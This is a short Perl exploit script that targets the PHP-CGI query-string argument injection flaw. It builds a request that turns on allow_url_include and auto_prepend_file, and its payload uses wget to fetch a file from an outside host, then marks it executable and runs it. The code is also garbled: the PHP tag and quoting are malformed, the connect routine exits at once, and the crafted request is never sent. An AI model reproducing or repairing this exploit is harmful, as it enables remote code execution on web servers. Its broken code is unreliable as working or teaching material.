#!/usr/bin/perl

use IO::Socket;
use Socket;

if (@ARGV<2) {
print "Usage:\n";
print "$0 <Host> (THATS iT!) - <OPTIONAL CMD [Ex: id]>\n";
exit(-1);
}

###my $cmd_exec_payload = "<php? shellexec(\"$cmd"\); ?>";  ## Optional only
my $payload = "<php? shellexec(wget -q http://fbi.gov/0day.txt;chmod +x 0day.txt;perl -e 0day.txt); ?>";

my $host=$ARGV[0];
my $cmd=$ARGV[1];
my($host, $cmd) = @ARGV or usage();

sub Connect {
print "[+] Connecting ..\n";
$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] Connect Error ..\n";
exit(-1);
}

$cmd = "POST http://". $host ."//cgi-bin/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3D". $payload ." HTTP/1.1\r\n";
print $sock "Host: $host\n";
print $sock "Accept: */*\n";
print $sock "\n\n";

while () {
$rp = rand;
&Connect;
print "[+] Executing command payload thru php-shellexec: ( $cmd ) ..\n";
my $answer=0;
print $sock;
if ($sock) {
print "[+] Sent evilcode,running: ( $cmd ) ..\n";
while ($answer=<$sock>) {
print $answer;
print results "[*] Server reply: ( $answer ) ..\n";
}
}
}
